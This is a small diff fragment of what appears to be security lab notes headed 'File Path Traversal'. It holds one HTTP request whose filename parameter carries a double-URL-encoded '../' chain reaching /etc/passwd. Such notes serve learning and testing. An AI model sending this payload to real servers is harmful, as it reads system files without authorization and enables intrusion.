@@ -1,4 +1,3 @@
-
 # File Path Traversal 
 ```
 GET /image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd HTTP/2
